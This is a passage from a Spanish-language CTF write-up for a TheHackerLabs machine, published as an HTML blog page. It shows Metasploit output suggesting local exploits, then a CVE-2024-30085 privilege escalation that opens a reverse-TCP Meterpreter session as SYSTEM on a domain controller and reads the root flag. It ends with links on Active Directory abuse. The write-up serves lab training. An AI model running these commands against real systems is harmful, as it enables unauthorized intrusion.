+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; use post/multi/recon/local_exploit_suggester
+</span></span><span style="display:flex;"><span>msf post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; set SESSION <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>SESSION <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Ejecutémoslo y esperemos los resultados:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; exploit
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.56.100 - Collecting local exploits <span style="color:#66d9ef">for</span> x64/windows...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">============================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#75715e">#   Name                                                           Potentially Vulnerable?  Check Result</span>
+</span></span><span style="display:flex;"><span> -   ----                                                           -----------------------  ------------
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">1</span>   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">2</span>   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">3</span>   exploit/windows/local/cve_2022_21882_win32k                    Yes                      The service is running, but could not be validated. May be vulnerable, but exploit not tested on Windows Server <span style="color:#ae81ff">2022</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">4</span>   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">5</span>   exploit/windows/local/cve_2023_28252_clfs_driver               Yes                      The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">6</span>   exploit/windows/local/cve_2024_30085_cloud_files               Yes                      The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">7</span>   exploit/windows/local/cve_2024_30088_authz_basep               Yes                      The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: <span style="color:#ae81ff">587</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">8</span>   exploit/windows/local/cve_2024_35250_ks_driver                 Yes                      The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server <span style="color:#ae81ff">2022</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">9</span>   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">10</span>  exploit/windows/local/virtual_box_opengl_escape                Yes                      The service is running, but could not be validated.
+</span></span></code></pre></div><p>Observa que tuvimos varios resultados; sin embargo, el único que funcionará será el módulo <code>exploit/windows/local/cve_2024_30085_cloud_files</code>.</p>
+<p>Vamos a cargarlo y a configurarlo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf post<span style="color:#f92672">(</span>multi/recon/local_exploit_suggester<span style="color:#f92672">)</span> &gt; use exploit/windows/local/cve_2024_30085_cloud_files
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>windows/local/cve_2024_30085_cloud_files<span style="color:#f92672">)</span> &gt; set SESSION <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>SESSION <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>windows/local/cve_2024_30085_cloud_files<span style="color:#f92672">)</span> &gt; set LHOST Tu_IP
+</span></span><span style="display:flex;"><span>LHOST <span style="color:#f92672">=</span>&gt; Tu_IP
+</span></span></code></pre></div><p>Ejecutémoslo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf exploit<span style="color:#f92672">(</span>windows/local/cve_2024_30085_cloud_files<span style="color:#f92672">)</span> &gt; exploit
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on Tu_IP:4444 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running automatic check <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;set AutoCheck false&#34;</span> to disable<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> The target appears to be vulnerable.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Launching notepad to host the exploit...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> The notepad path is: C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\n</span>otepad.exe
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> The notepad pid is: <span style="color:#ae81ff">1348</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Reflectively injecting the DLL into 1348...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">230982</span> bytes<span style="color:#f92672">)</span> to 192.168.56.100
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">2</span> opened <span style="color:#f92672">(</span>Tu_IP:4444 -&gt; 192.168.56.100:64564<span style="color:#f92672">)</span> at 2026-04-29 19:34:25 -0600
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; sysinfo
+</span></span><span style="display:flex;"><span>Computer        : DC01
+</span></span><span style="display:flex;"><span>OS              : Windows Server <span style="color:#ae81ff">2022</span> <span style="color:#f92672">(</span>10.0 Build 20348<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Architecture    : x64
+</span></span><span style="display:flex;"><span>System Language : es_ES
+</span></span><span style="display:flex;"><span>Domain          : PHANTOM
+</span></span><span style="display:flex;"><span>Logged On Users : <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>Meterpreter     : x64/windows
+</span></span><span style="display:flex;"><span>meterpreter &gt; getuid
+</span></span><span style="display:flex;"><span>Server username: NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
+</span></span></code></pre></div><p>Tardó un poco, pero pudimos utilizar este módulo para escalar privilegios.</p>
+<p>Ya solamente buscamos la última flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>meterpreter &gt; shell
+</span></span><span style="display:flex;"><span>Process 2408 created.
+</span></span><span style="display:flex;"><span>Channel 1 created.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Microsoft Windows [Versi�n 10.0.20348.587]
+</span></span><span style="display:flex;"><span>(c) Microsoft Corporation. Todos los derechos reservados.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:\Users\robert\Documents<span style="color:#75715e">&gt;cd ..\..\Administrador\Desktop</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">cd</span> ..\..\Administrador\Desktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:\Users\Administrador\Desktop<span style="color:#75715e">&gt;type root.txt</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">type</span> root.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Y con esto, terminamos la máquina.</p>
+<p><strong>Nota</strong>: Esta forma de escalada de privilegios puede ser un poco inestable y puede que tarde mucho en aplicarse el módulo. Además, si utilizaste esta forma y quieres volver a usarla después, no funcionará, por lo que tendrías que desinstalar e instalar de nuevo la máquina virtual.</p>
+
+
+    
+    <h2 id="links-de-investigacion">Links de investigación</h2>
+    <ul>
+      <li><a href="https://www.hackingarticles.in/tag/dacl-abuse/" target="_blank" rel="noopener noreferrer">https://www.hackingarticles.in/tag/dacl-abuse/</a></li><li><a href="https://www.hackingarticles.in/abusing-ad-dacl-writeowner/" target="_blank" rel="noopener noreferrer">https://www.hackingarticles.in/abusing-ad-dacl-writeowner/</a></li><li><a href="https://www.hackingarticles.in/addself-active-directory-abuse/" target="_blank" rel="noopener noreferrer">https://www.hackingarticles.in/addself-active-directory-abuse/</a></li><li><a href="https://github.com/ShutdownRepo/targetedKerberoast" target="_blank" rel="noopener noreferrer">https://github.com/ShutdownRepo/targetedKerberoast</a></li><li><a href="https://www.hackingarticles.in/abusing-ad-dacl-writedacl/" target="_blank" rel="noopener noreferrer">https://www.hackingarticles.in/abusing-ad-dacl-writedacl/</a></li><li><a href="https://www.hackingarticles.in/forcechangepassword-active-directory-abuse/" target="_blank" rel="noopener noreferrer">https://www.hackingarticles.in/forcechangepassword-active-directory-abuse/</a></li><li><a href="https://evoila.com/blog/llmnr-poisoning/" target="_blank" rel="noopener noreferrer">https://evoila.com/blog/llmnr-poisoning/</a></li><li><a href="https://www.cobalt.io/blog/llmnr-poisoning-ntlm-relay" target="_blank" rel="noopener noreferrer">https://www.cobalt.io/blog/llmnr-poisoning-ntlm-relay</a></li><li><a href="https://admindroid.com/how-to-get-deleted-users-in-active-directory" target="_blank" rel="noopener noreferrer">https://admindroid.com/how-to-get-deleted-users-in-active-directory</a></li><li><a href="https://activedirectorypro.com/how-to-check-tombstone-lifetime-of-active-directory/" target="_blank" rel="noopener noreferrer">https://activedirectorypro.com/how-to-check-tombstone-lifetime-of-active-directory/</a></li><li><a href="https://github.com/61106960/adPEAS" target="_blank" rel="noopener noreferrer">https://github.com/61106960/adPEAS</a></li><li><a href="https://github.com/peass-ng/PEASS-ng" target="_blank" rel="noopener noreferrer">https://github.com/peass-ng/PEASS-ng</a></li><li><a href="https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc3/#elementor-toc__heading-anchor-4" target="_blank" rel="noopener noreferrer">https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc3/#elementor-toc__heading-anchor-4</a></li><li><a href="https://www.hackingarticles.in/adcs-esc3-enrollment-agent-template/" target="_blank" rel="noopener noreferrer">https://www.hackingarticles.in/adcs-esc3-enrollment-agent-template/</a></li><li><a href="https://zonahacking.com/post/esc3" target="_blank" rel="noopener noreferrer">https://zonahacking.com/post/esc3</a></li>
+    </ul>
+    
+  </div>
+
+  
+
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+<nav class="post-nav">
+  
+  <a class="post-nav-link post-nav-prev" href="http://localhost:1313/THL-writeup-thlpwn/">
+    <span class="post-nav-label">← Anterior</span>
+    <span class="post-nav-title">THLPWN - TheHackerLabs</span>
+  </a>
+  
+  
+  <a class="post-nav-link post-nav-next" href="http://localhost:1313/THL-writeup-zapp/">
+    <span class="post-nav-label">Siguiente →</span>
+    <span class="post-nav-title">ZAPP - TheHackerLabs</span>
+  </a>
+  
+</nav>
+
+
+
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <p>&copy; 2026 BerserkWings · México
+       · <a href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </p>
+  </div>
+</footer>
+
+  
+
+
+<a href="#indice" class="back-to-top" id="backToTop" aria-label="Volver al índice">&uarr;</a>
+
+
+<script src="/js/main.min.15ff80349759f71df793ae28568ef0a6a9c3eb6efe99c9e96bad1d9236a26c31.js" integrity="sha256-Ff&#43;ANJdZ9x33k64oVo7wpqnD627&#43;mcnpa60dkjaibDE=" defer></script>
+
+</body>
+</html>
